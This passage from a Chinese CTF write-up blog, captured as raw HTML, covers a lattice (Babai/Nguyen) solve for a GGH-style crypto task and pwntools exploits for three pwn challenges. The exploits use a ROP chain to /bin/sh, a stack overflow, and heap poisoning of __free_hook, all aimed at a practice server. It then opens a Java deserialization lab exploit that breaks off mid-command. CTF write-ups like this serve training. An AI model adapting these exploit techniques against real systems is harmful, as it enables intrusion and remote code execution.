class="number">227575274</span>, -<span class="number">628937118</span>, <span class="number">5466646</span>, -<span class="number">254939474</span>, -<span class="number">438417079</span>, <span class="number">150434624</span>, <span class="number">327054986</span>, <span class="number">163561829</span>, <span class="number">816959939</span>, -<span class="number">265298657</span>,</span><br><span class="line"><span class="number">82651050</span>, <span class="number">176899880</span>, <span class="number">174020455</span>, -<span class="number">419656325</span>, -<span class="number">101606182</span>, <span class="number">300413909</span>, <span class="number">237169571</span>, -<span class="number">589213744</span>, <span class="number">121803611</span>, -<span class="number">38080334</span>,</span><br><span class="line">-<span class="number">255712509</span>, -<span class="number">133782964</span>, <span class="number">106220001</span>, <span class="number">195767251</span>, -<span class="number">397096116</span>, -<span class="number">583305587</span>, -<span class="number">182462561</span>, -<span class="number">271478737</span>, -<span class="number">32014717</span>, <span class="number">114385188</span>,</span><br><span class="line"><span class="number">437506115</span>, -<span class="number">1165732</span>, <span class="number">179349265</span>, -<span class="number">77761751</span>, -<span class="number">233976783</span>, <span class="number">410153356</span>, <span class="number">476453640</span>, <span class="number">91892631</span>, -<span class="number">242168750</span>, <span class="number">506769243</span>,</span><br><span class="line">-<span class="number">384438362</span>, <span class="number">131852532</span>, <span class="number">586202810</span>, <span class="number">376719791</span>, <span class="number">578215353</span>, <span class="number">874304742</span>, <span class="number">163584566</span>, <span class="number">434260863</span>, <span class="number">98013671</span>, <span class="number">213627784</span>, <span class="number">59622886</span>,</span><br><span class="line">-<span class="number">84912852</span>, <span class="number">156744856</span>, <span class="number">169652328</span>, <span class="number">178143615</span>, <span class="number">400046730</span>, <span class="number">408163110</span>, -<span class="number">357990863</span>, -<span class="number">269552089</span>, -<span class="number">199410809</span>, <span class="number">187503858</span>,</span><br><span class="line">-<span class="number">853206157</span>, <span class="number">134901027</span>, <span class="number">313984185</span>, -<span class="number">162544217</span>, -<span class="number">69722073</span>, <span class="number">43817388</span>, -<span class="number">47389463</span>, <span class="number">210346729</span>, -<span class="number">46516961</span>, <span class="number">72002967</span>, <span class="number">327714191</span>,</span><br><span class="line"><span class="number">45052266</span>, <span class="number">1010509210</span>, <span class="number">110937225</span>, <span class="number">448179404</span>, <span class="number">341448936</span>, <span class="number">446550865</span>, <span class="number">221914340</span>, -<span class="number">804918424</span>, -<span class="number">12007071</span>, <span class="number">151215468</span>,</span><br><span class="line"><span class="number">440279795</span>, -<span class="number">73408566</span>, -<span class="number">112121988</span>, <span class="number">40294376</span>, <span class="number">283179449</span>, -<span class="number">193812410</span>, -<span class="number">30061804</span>, <span class="number">20326854</span>, <span class="number">65412625</span>, -<span class="number">260020045</span>,</span><br><span class="line">-<span class="number">570090340</span>, <span class="number">1546454</span>, <span class="number">548030557</span>, <span class="number">618148316</span>, <span class="number">290333796</span>, <span class="number">665474379</span>, <span class="number">301709165</span>, -<span class="number">104726821</span>, -<span class="number">503111899</span>, <span class="number">480689642</span>,</span><br><span class="line">-<span class="number">331192606</span>, -<span class="number">518345784</span>, -<span class="number">314602459</span>, <span class="number">25354403</span>, <span class="number">410995568</span>, <span class="number">179675848</span>, -<span class="number">207010027</span>, <span class="number">400838662</span>, <span class="number">125916880</span>, <span class="number">501112567</span>,</span><br><span class="line"><span class="number">578261227</span>, <span class="number">24802586</span>, <span class="number">493171331</span>, <span class="number">383306766</span>, -<span class="number">390093502</span>, -<span class="number">389822626</span>, -<span class="number">303615722</span>, <span class="number">20813851</span>, -<span class="number">399678371</span>, -<span class="number">566907567</span>,</span><br><span class="line">-<span class="number">432647113</span>, -<span class="number">280465568</span>, <span class="number">1002042393</span>, -<span class="number">510901339</span>, <span class="number">316603766</span>, -<span class="number">139701243</span>, <span class="number">211217523</span>, <span class="number">108545545</span>, -<span class="number">12948109</span>, -<span class="number">569199543</span>,</span><br><span class="line"><span class="number">37065919</span>, -<span class="number">150542603</span>, <span class="number">417851006</span>, -<span class="number">470173530</span>, -<span class="number">628557669</span>, -<span class="number">128339015</span>, -<span class="number">427978763</span>, <span class="number">381402990</span>, <span class="number">205835334</span>, -<span class="number">30976552</span>,</span><br><span class="line">-<span class="number">357466556</span>, -<span class="number">104985580</span>, -<span class="number">115366372</span>, <span class="number">296031071</span>, -<span class="number">8036087</span>, <span class="number">79340491</span>, <span class="number">650365147</span>, <span class="number">295521125</span>, <span class="number">885900267</span>, <span class="number">133049758</span>,</span><br><span class="line"><span class="number">217970062</span>, <span class="number">237420894</span>, <span class="number">358760095</span>, -<span class="number">2684469</span>, <span class="number">475711698</span>, <span class="number">316770575</span>, -<span class="number">25024622</span>, -<span class="number">193442003</span>, <span class="number">200260606</span>, <span class="number">89183826</span>, <span class="number">567491985</span>,</span><br><span class="line"><span class="number">726371428</span>, <span class="number">222116554</span>, <span class="number">87397506</span>, -<span class="number">29529094</span>, <span class="number">125968479</span>, -<span class="number">50793004</span>, <span class="number">218035181</span>, -<span class="number">210376687</span>, <span class="number">1025673749</span>, -<span class="number">262390458</span>,</span><br><span class="line"><span class="number">467412984</span>, -<span class="number">71097225</span>, <span class="number">259125517</span>, -<span class="number">337232810</span>, <span class="number">143359550</span>, <span class="number">27115363</span>)</span><br><span class="line"></span><br><span class="line">D = matrix(ZZ, <span class="number">66</span>*<span class="number">3</span>, <span class="number">200</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        D[i,j] = A[i][j]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        D[i+<span class="number">66</span>,j] = B[i][j]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        D[i+<span class="number">66</span>*<span class="number">2</span>,j] = C[i][j]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = vector(b)</span><br><span class="line">W = matrix(D)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">babai</span>(<span class="params">A, w</span>):</span></span><br><span class="line">    A = A.LLL()</span><br><span class="line">    G = A.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">    t = w</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(A.nrows())):</span><br><span class="line">        c = ((t * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">        t -= A[i] * c</span><br><span class="line">    <span class="keyword">return</span> w - t</span><br><span class="line">V = babai(W,e)</span><br><span class="line">m = V/W</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不过用下面这种好像要快亿点（大概1分半）</p>
<p>小注意：</p>
<ul>
<li>solve_left()方法好像要一个方方正正的矩阵所以改成了198×198的矩阵</li>
<li>利用Nguyen’s Attack算法，不过这里的delta变成了1，加密代码中的errorV由<img src="https://cdn.nlark.com/yuque/__latex/8a222a25af7aea8861bd2f55a1cce797.svg" alt="img">组成，与GGH加密中的误差向量取3或-3相对比，delta自然变成了1。</li>
<li>原GGH加密中的误差向量取3或-3，这里取的-1，0，1，m解出来存在误差，四舍五入一下就好了</li>
<li>参考：<a href="https://blog.soreatu.com/posts/intended-solution-to-ggh-in-gyctf-2020/">GYCTF 2020 - GGH</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据导入省略</span></span><br><span class="line">c = vector(ZZ, b)[:<span class="number">198</span>]</span><br><span class="line"><span class="comment"># B = matrix(ZZ, D)</span></span><br><span class="line">B = matrix(ZZ, <span class="number">198</span>, <span class="number">198</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">198</span>):</span><br><span class="line">    B[i] = D[i][:<span class="number">198</span>]</span><br><span class="line">n = <span class="number">198</span></span><br><span class="line">delta = <span class="number">1</span></span><br><span class="line">s = vector(ZZ, [delta]*n)</span><br><span class="line">B6 = B.change_ring(Zmod(<span class="number">2</span>*delta))</span><br><span class="line">left = (c + s).change_ring(Zmod(<span class="number">2</span>*delta))</span><br><span class="line">m6 = (B6.solve_left(left)).change_ring(ZZ)</span><br><span class="line">new_c = (c - m6*B) * <span class="number">2</span> / (<span class="number">2</span>*delta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># embedded technique</span></span><br><span class="line">new_B = (B*<span class="number">2</span>).stack(new_c).augment(vector(ZZ, [<span class="number">0</span>]*n + [<span class="number">1</span>]))</span><br><span class="line">new_B = new_B.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">new_B_BKZ = new_B.BKZ()</span><br><span class="line">shortest_vector = new_B_BKZ[<span class="number">0</span>]</span><br><span class="line">mbar = (B*<span class="number">2</span>).solve_left(new_c - shortest_vector[:-<span class="number">1</span>])</span><br><span class="line">m = mbar * (<span class="number">2</span>*delta) + m6</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">round</span>(i))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h3><p>输入size的时候有一个整数溢出，所以通过栈溢出就能完成</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#encoding: utf-8</span></span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">#context.log_level = <span class="meta-string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">binary_name = <span class="string">&quot;pwn4&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;libc-2.31.so&quot;</span></span><br><span class="line">ld_name = <span class="string">&quot;ld&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">version = <span class="string">&quot;9.9&quot;</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;</span>.format(libc_name,version,libc_name))</span><br><span class="line"><span class="meta">#ld = ELF(<span class="meta-string">&quot;./&quot;</span>+ld_name)</span></span><br><span class="line">se      = lambda data               :io.send(data) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = lambda num          		:io.recv(num)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">ru      = lambda delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))	</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">info    = lambda tag, addr          :<span class="built_in">log</span>.info(tag + <span class="string">&quot; -------------&gt; &quot;</span> + hex(addr))</span><br><span class="line">ia		= lambda                    :io.interactive()</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26010</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		b *<span class="number">0x00400805</span></span><br><span class="line">		<span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400983</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400981</span></span><br><span class="line">ret = <span class="number">0x000000000040063e</span></span><br><span class="line">leave_addr=<span class="number">0x0400914</span></span><br><span class="line">bss_addr = <span class="number">0x006010C0</span></span><br><span class="line">system_plt = <span class="number">0x0400680</span></span><br><span class="line">payload = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">30</span>+p64(bss_addr)+p64(leave_addr)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;go&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;message&#x27;</span>,<span class="string">&#x27;71&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;16899&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;3272&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;13694&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(str(<span class="number">0xff00002f</span>))</span><br><span class="line"><span class="meta">#debug()</span></span><br><span class="line">sl(<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">48</span>)+p64(pop_rdi_ret)+p64(bss_addr)+p64(<span class="number">0x04007C9</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h3 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h3><p>溢出覆盖之后只要让程序leak一下，sercet就会变回去，然后注意一下栈上的v4要为0就好了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#encoding: utf-8</span></span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">#context.log_level = <span class="meta-string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">binary_name = <span class="string">&quot;MyCanary2&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;libc-2.31.so&quot;</span></span><br><span class="line">ld_name = <span class="string">&quot;ld&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">version = <span class="string">&quot;9.9&quot;</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;</span>.format(libc_name,version,libc_name))</span><br><span class="line"><span class="meta">#ld = ELF(<span class="meta-string">&quot;./&quot;</span>+ld_name)</span></span><br><span class="line">se      = lambda data               :io.send(data) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = lambda num          		:io.recv(num)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">ru      = lambda delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))	</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">info    = lambda tag, addr          :<span class="built_in">log</span>.info(tag + <span class="string">&quot; -------------&gt; &quot;</span> + hex(addr))</span><br><span class="line">ia		= lambda                    :io.interactive()</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26141</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line"># <span class="number">0x00004014A4</span>   <span class="number">0x00401519</span>  </span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		b *<span class="number">0x00004014A4</span> </span><br><span class="line">		<span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line">bin_sh_addr = <span class="number">0x004020F0</span></span><br><span class="line">rand_addr = <span class="number">0x04040D0</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">shell_addr = <span class="number">0x000000000401573</span></span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">80</span>+<span class="number">16</span>+<span class="number">12</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x0040157B</span>)</span><br><span class="line">sla(<span class="string">&quot;Show me the code:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h3 id="compat"><a href="#compat" class="headerlink" title="compat"></a>compat</h3><blockquote>
<p>复现</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">binary_name = <span class="string">&quot;compact&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;libc-2.31.so&quot;</span></span><br><span class="line">ld_name = <span class="string">&quot;ld&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">version = <span class="string">&quot;9.0&quot;</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(libc_name,version,libc_name))</span><br><span class="line"><span class="comment">#ld = ELF(&quot;./&quot;+ld_name)</span></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :io.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> num          		:io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))	</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -------------&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia		= <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29037</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data,tag</span>):</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line">	sa(<span class="string">&#x27;tag:&#x27;</span>,tag)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>():</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;\xf0&quot;</span>)</span><br><span class="line">se(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">heap_addr = uu64(io.recv(<span class="number">6</span>))</span><br><span class="line">info(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	delete(<span class="built_in">str</span>(i))</span><br><span class="line">add(<span class="string">&quot;bbb&quot;</span>,<span class="string">&#x27;\xfc&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">manage_heap = heap_addr + <span class="number">944</span></span><br><span class="line">payload =<span class="string">b&#x27;aaa&#x27;</span>+p8((manage_heap)&amp;<span class="number">0xff</span>)+p8((manage_heap&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">unsor_heap = heap_addr + <span class="number">1232</span></span><br><span class="line">add(<span class="string">&quot;ccc&quot;</span>,<span class="string">&quot;\xfc&quot;</span>) <span class="comment">#1</span></span><br><span class="line">payload =<span class="string">b&#x27;aaa&#x27;</span>+p8((unsor_heap)&amp;<span class="number">0xff</span>)+p8((unsor_heap&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">target_heap = heap_addr + <span class="number">880</span></span><br><span class="line">payload =<span class="string">b&#x27;aaa&#x27;</span>+p8((target_heap)&amp;<span class="number">0xff</span>)+p8((target_heap&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">add(<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;\xfc&quot;</span>) <span class="comment">#2</span></span><br><span class="line">sl(payload)</span><br><span class="line">reset()</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">libcbase = uu64(io.recv(<span class="number">6</span>)) - <span class="number">2014176</span></span><br><span class="line">info(<span class="string">&quot;libcbase&quot;</span>,libcbase)</span><br><span class="line">system_addr= libcbase + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one=[<span class="number">0xe6aee</span>+libcbase,<span class="number">0xe6af1</span>+libcbase,<span class="number">0xe6af4</span>+libcbase]</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">info(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">reset()</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>)</span><br><span class="line">add(payload,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">reset()</span><br><span class="line">payload =p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0x91</span>)+p64(free_hook)</span><br><span class="line">add(payload,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(p64(<span class="number">0</span>),<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(p64(one[<span class="number">1</span>]),<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">reset()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#reset()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaDeserializeLabs</title>
    <url>/2022/07/22/JavaDeserializeLabs/</url>
    <content><![CDATA[<h1 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h1><p><a href="https://github.com/waderwu/javaDeserializeLabs.git">https://github.com/waderwu/javaDeserializeLabs.git</a></p>
<h2 id="Lab1-Basic"><a href="#Lab1-Basic" class="headerlink" title="Lab1-Basic"></a>Lab1-Basic</h2><blockquote>
<p>docker-compose up -d</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c8afd0613ade4c18bb950e13b902de02.png" alt="Untitled"></p>
<p>知道触发点为basic目录下直接传一个data</p>
<p>直接用jd-gui看jar包，发现没有CC依赖，但是给了几个类。而Calc类刚好是我们可以利用的，并且可以执行任意命令，没有任何过滤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicclass Calcimplements Serializable &#123;</span><br><span class="line">privateboolean canPopCalc =<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String cmd = <span class="string">&quot;ls -al&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">privatevoid <span class="title">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    objectInputStream.defaultReadObject();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.canPopCalc)</span><br><span class="line">      Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么直接来构造exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.Calc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeriaCalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFiled</span><span class="params">(Object obj,String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Calc calc = <span class="keyword">new</span> Calc();</span><br><span class="line">				setFiled(calc, <span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;bash -c 